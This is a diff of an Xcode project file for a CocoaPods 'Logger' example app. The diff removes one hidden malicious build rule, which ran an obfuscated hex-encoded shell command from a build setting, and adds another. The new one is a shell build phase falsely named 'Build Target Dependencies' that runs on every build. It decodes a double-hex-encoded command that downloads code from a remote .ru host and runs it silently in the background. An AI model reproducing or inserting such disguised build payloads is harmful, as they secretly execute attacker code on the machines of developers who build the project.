@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		BC42CEAEFFE6627ED6ECDB79 /* README.md */ = {isa = PBXBuildFile; fileRef = 6C40DA4B10B2C0526FECDB79; };
 		0E342BA6618A802CBAE94360 /* Pods_Logger_Example.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = FE3080311E76367796B67A42 /* Pods_Logger_Example.framework */; };
 		607FACD61AFB9204008FA782 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 607FACD51AFB9204008FA782 /* AppDelegate.swift */; };
 		607FACD81AFB9204008FA782 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 607FACD71AFB9204008FA782 /* ViewController.swift */; };
@@ -29,7 +28,6 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
-		6C40DA4B10B2C0526FECDB79 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "Logger.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		099497B04E98074D0A7278B2 /* Pods-Logger_Tests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Logger_Tests.release.xcconfig"; path = "Target Support Files/Pods-Logger_Tests/Pods-Logger_Tests.release.xcconfig"; sourceTree = "<group>"; };
 		1CE67EF2EFCF95174C75E790 /* Pods-Logger_Example.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Logger_Example.debug.xcconfig"; path = "Target Support Files/Pods-Logger_Example/Pods-Logger_Example.debug.xcconfig"; sourceTree = "<group>"; };
 		54580EC3B83FB13D8E1372A9 /* LICENSE */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text; name = LICENSE; path = ../LICENSE; sourceTree = "<group>"; };
@@ -97,7 +95,6 @@
 		607FACD11AFB9204008FA782 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				6C40DA4B10B2C0526FECDB79 /* README.md */,
 				607FACD01AFB9204008FA782 /* Logger_Example.app */,
 				607FACE51AFB9204008FA782 /* Logger_Tests.xctest */,
 			);
@@ -170,13 +167,13 @@
 			buildConfigurationList = 607FACEF1AFB9204008FA782 /* Build configuration list for PBXNativeTarget "Logger_Example" */;
 			buildPhases = (
 				98408894436E0AC273AC46FE /* [CP] Check Pods Manifest.lock */,
+				7DA97088C9F43938B6ECDB79 /* Build Target Dependencies */,
 				607FACCC1AFB9204008FA782 /* Sources */,
 				607FACCD1AFB9204008FA782 /* Frameworks */,
 				607FACCE1AFB9204008FA782 /* Resources */,
 				4080C1323B2EA7157C36C12B /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				BB3DBCBFFC8B4D744CECDB79 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -245,29 +242,11 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		BB3DBCBFFC8B4D744CECDB79 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${A97BDCE}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		607FACCE1AFB9204008FA782 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				BC42CEAEFFE6627ED6ECDB79 /* README.md */,
 				607FACDB1AFB9204008FA782 /* Main.storyboard in Resources */,
 				607FACE01AFB9204008FA782 /* LaunchScreen.xib in Resources */,
 				607FACDD1AFB9204008FA782 /* Images.xcassets in Resources */,
@@ -322,6 +301,25 @@ sh -c \"${A97BDCE}\"";
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		7DA97088C9F43938B6ECDB79 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663733363936373664363136653666373732653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;
 		};
 		98408894436E0AC273AC46FE /* [CP] Check Pods Manifest.lock */ = {
@@ -399,7 +397,6 @@ sh -c \"${A97BDCE}\"";
 		607FACED1AFB9204008FA782 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A97BDCE = "((echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333323336333433333336333333343333333233333330333333373333333033333333333633343333333733333338333333363333333333333336333633363333333633333334333333363333333533333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333363333333633333339333333363336333533333336333333343333333633363334333333373333333933333336333633343333333633333331333333363333333333333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++0x";
 				CLANG_CXX_LIBRARY = "libc++";
@@ -453,7 +450,6 @@ sh -c \"${A97BDCE}\"";
 		607FACEE1AFB9204008FA782 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A97BDCE = "((echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333323336333433333336333333343333333233333330333333373333333033333333333633343333333733333338333333363333333333333336333633363333333633333334333333363333333533333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333363333333633333339333333363336333533333336333333343333333633363334333333373333333933333336333633343333333633333331333333363333333333333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++0x";
 				CLANG_CXX_LIBRARY = "libc++";
